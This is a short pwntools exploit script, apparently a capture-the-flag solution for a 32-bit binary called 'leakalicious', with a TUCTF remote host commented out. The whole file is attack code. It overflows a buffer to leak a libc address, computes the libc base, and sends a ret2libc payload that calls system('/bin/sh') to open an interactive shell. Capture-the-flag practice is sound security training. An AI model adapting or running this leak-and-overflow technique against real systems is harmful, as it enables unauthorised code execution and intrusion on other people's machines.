#!/usr/bin/python3
from pwn import *
context.arch = 'i386'

# p = remote('chal.tuctf.com', 30505)
p = process('./leakalicious')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')

p.sendlineafter(b'> ', b'a'*0x28 + b'b'*0x3)
p.recvuntil(b'\x0a')
libc.address = u32(p.recv(4)) - 0x18637
log.info('libc.address: %s' % hex(libc.address))

p.sendlineafter(b'> ', b'garbage')

payload = b'a'*0x28 + b'b'*0x4 + p32(libc.symbols['system']) + b'c'*0x4 + p32(next(libc.search(b'/bin/sh\x00')))
p.sendlineafter(b'> ', payload)

p.interactive()
